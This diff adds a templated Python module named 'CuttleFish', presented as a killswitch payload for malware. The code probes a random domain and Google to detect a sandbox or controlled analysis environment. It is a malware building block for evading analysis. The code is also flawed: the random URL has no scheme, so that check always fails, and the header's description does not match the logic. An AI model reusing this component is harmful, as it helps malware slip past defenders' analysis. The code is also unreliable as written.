@@ -1,0 +1,27 @@
+{#---
+name: CuttleFish
+functionnality_type: Killswitch
+lang: python
+description: >
+    CuttleFish is a killswitch payload that checks if the malware is running in a controlled environment.
+    It attempts to connect to a random URL and also checks connectivity to Google.
+    If both checks fail, it returns True, indicating a killswitch condition.
+---#}
+
+# --- PAYLOAD CODE ---
+def killswitch():
+    url = ''.join(random.choices(string.ascii_letters + string.digits, k=40)) + ".com"
+    try:
+        request_random = requests.get(url)
+        if request_random.status_code == 200:
+            return True
+    except requests.exceptions.RequestException:
+        pass
+    try:
+        request_google = requests.get("https://www.google.com")
+        if request_google.status_code == 200:
+            return False
+        else:
+            return True
+    except requests.exceptions.RequestException:
+        return True
